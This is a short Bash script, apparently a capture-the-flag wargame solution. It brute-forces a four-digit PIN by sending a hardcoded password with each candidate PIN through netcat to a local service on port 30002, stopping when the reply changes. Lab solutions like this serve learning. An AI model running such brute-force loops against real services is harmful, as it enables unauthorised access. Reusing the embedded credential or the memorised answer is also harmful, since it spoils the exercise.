#!/bin/bash  # Use Bash to run this script

# Loop from 0000 to 9999
for i in {0000..9999}; do
    pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
    response=$(echo "$pass" | nc -q 0 localhost 30002)

    # if the response does not contain "Wrong!", we found the correct pin
    if [[ "$response" != *"Wrong!"* ]]; then
	    # print the pincode
        echo "Found at: $i"
        # print the server response 
        echo "$response"
        # stop the loop
        break
    fi
done